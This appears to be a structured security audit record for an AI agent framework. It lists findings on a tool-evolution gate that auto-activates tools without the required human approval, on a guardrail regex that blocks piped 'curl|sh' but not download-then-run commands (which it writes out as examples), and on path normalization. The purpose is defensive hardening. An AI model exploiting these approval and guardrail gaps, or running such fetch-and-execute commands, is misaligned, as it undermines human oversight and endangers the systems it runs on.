items.title: evolve_tool auto-activates shadow-status tools without approval or shadow evidence
items.caveat: sensitive: changes the promotion gate — when/how a tool becomes active is user-visible and invariant-adjacent; needs confirmation when applied
items.summary: canActivate now routes through an exported canAutoActivate(status,requiresApproval,runs,ranShadow,dryRun); a system-radius (requiresApproval) tool stays shadow and needs /evolve activate (gated). +3 tests in test/evolution.test.ts.
items.finding: In buildEvolveTool, `canActivate = !gate.dryRun && status === "shadow"` (src/index.ts:483) promotes any shadow-status tool straight to "active", ignoring `budget.requiresApproval`. A `maxRadius:"system"` create yields initialStatusFor -> "shadow" (src/tools/evolution.ts:112-118) yet `requiresApproval` is computed true (evolution.ts:138) but never consulted downstream, and the gate's risk is derived from `kind` (evolve_tool create -> module radius, auto-trusted in src/approval.ts:71). Net: a system-radius proposal auto-activates with empty metrics and no user confirmation, bypassing the "human approval mandatory before a tool goes active" invariant stated in src/evaluation.ts:5.
items.recommendation: Make `canActivate` require `!final.budget.requiresApproval` AND that a shadow evaluation actually ran (metrics.runs > 0 or params.runShadow), or force user activation via `/evolve activate` for system/external-effect radii. Add tests asserting a system-radius create stays non-active until explicitly activated.

items.title: NETWORK_INJECT only catches piped remote-exec, not download-then-run
items.caveat: sensitive: hard-stop boundary — documented as intentional per user's 'go' (no behavior change)
items.summary: Documented that only piped remote-exec (curl|sh) is a hard stop; download-then-run (curl -o x && sh x) is intentionally approval-gated, not hard-blocked. No regex/behavior change. Added: a code note above NETWORK_INJECT and on the classifyAction default return (guardrails.ts), a note in docs/threat-model.md, and a regression test locking in that &&/-o forms are NOT hardStops while the pipe form remains 'network-injection'.

gates.test: PASS (174, +1 'download-then-run approval-gated, NOT a hardStop (intentional boundary)')

items.finding: `NETWORK_INJECT` (src/guardrails.ts:41) requires a literal pipe, so `curl http://e/x -o x.sh && sh x.sh` or `wget ... -O x && ./x` evade the hard stop. Such commands are not matched by DESTRUCTIVE/PRIVILEGE either and fall to a `project`/external-effect classification that is merely approval-gated, not hard-blocked — a defense-in-depth gap against the documented hard-stop list (threat model: NETWORK_INJECT).
items.recommendation: Either broaden the hard-stop to detect remote-fetch-then-execute (download-then-run) forms, or explicitly document that only piped injection is a hard stop and remote downloads are approval-gated — so the boundary is intentional rather than incidental.
items.risk: sensitive: touches the hard-stop boundary; expanding or documenting it changes which commands are blocked outright — confirm when applied

items.title: isFrameworkSource normalize does not resolve .. segments
items.caveat: preserving: safe-direction today; makes containment canonical/order-independent
items.summary: normalize() resolved consecutive slashes but left . / .. un-flattened, so isFrameworkSource's containment test was order-dependent (a <root>/.. form could be over-blocked). Rewrote normalize to canonically resolve . / .. segments (pure, no node:path) and normalized the relative branch too, making the check order-independent. Added 3 tests: .. escaping the root -> false, .. staying in-root -> true, . collapsing.
items.finding: `isFrameworkSource` (src/guardrails.ts:~230) normalizes paths by collapsing `//` -> `/` but does not resolve `..`/`.` segments, then tests `abs === root || abs.startsWith(root + "/")`. A path like `<root>/sub/../x` still passes the startsWith test and is over-blocked; the containment check is order-dependent because `..` is left un-flattened. Current direction is over-block (safe), which is why this is low priority.
items.recommendation: Resolve `.`/`..` segments (a small canonical path cleanup) before the startsWith containment test so the check is canonical rather than string-prefix based.
items.risk: preserving: currently safe-direction only; a cleanup that makes the containment test order-independent
